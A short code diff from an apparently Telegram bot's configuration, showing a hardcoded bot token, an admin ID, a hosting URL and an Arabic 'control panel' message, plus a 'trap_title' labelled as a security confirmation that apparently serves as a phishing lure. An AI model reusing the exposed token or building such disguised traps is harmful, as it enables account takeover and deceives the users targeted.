@@ -10,8 +10,6 @@ BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
 BASE_URL = "https://sif-pro.onrender.com" 
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
-SUB_URL = "https://t.me/FAABOT?start=7041600701" 
-
 system_config = {
     "welcome_msg": "🔥 أهلاً بك يا ملك في لوحة التحكم v40.0\n\n🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`",
     "trap_title": "تأكيد الأمان الموحد",
